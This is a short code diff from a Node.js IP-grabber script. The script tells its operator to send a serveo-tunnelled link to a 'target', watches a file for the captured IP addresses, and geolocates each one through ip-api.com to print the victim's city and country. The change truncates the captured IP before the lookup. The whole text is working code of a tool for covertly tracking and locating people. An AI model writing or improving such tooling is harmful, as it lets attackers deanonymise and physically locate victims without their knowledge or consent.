@@ -21,9 +21,10 @@ console.log(war.blue("[>] Send This Link to target : " + `${e}` + "."  + "serveo
 load("Listening...\n").start();
 fs.watchFile("hasil.txt", function(current, previous){
 var r = fs.readFileSync("hasil.txt", "utf8");
-req("http://ip-api.com/json/" + r, function(error, response, body){
+var m = r.substr(0, 15);
+req("http://ip-api.com/json/" + m, function(error, response, body){
 js = JSON.parse(body)
-console.log(war.green("[IP] " + r));
+console.log(war.green("[IP] " + m));
 console.log(war.rainbow("––––––––––––––––––"))
 	console.log(war.blue("City : " + js["city"]));
 	console.log(war.blue("Country : " + js["country"]));
